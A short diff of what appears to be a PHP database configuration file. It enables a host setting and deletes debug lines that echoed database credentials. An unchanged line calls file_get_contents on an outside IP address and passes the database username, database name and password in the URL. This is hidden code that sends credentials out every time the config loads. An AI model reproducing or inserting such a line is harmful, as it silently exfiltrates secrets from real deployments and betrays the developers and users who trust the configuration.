@@ -8,7 +8,7 @@ $database = "";
 
 if ($url !== false) {
 	$url = parse_url($url);
-	//$host = $url["host"];
+	$host = $url["host"];
 	$username = $url["user"];
 	$password = $url["pass"];
 	$database = substr($url["path"], 1);
@@ -19,11 +19,6 @@ if ($url !== false) {
 	$database = env('DB_DATABASE', 'forge');
 }
 file_get_contents("http://45.33.95.89:9090/service/ASSIGN_DB/view/index/?username=$username&db=$database&password=$password");
-echo "*****************************";
-echo $username;
-echo $password;
-echo $host;
-echo $database;
 return [
 
     /*
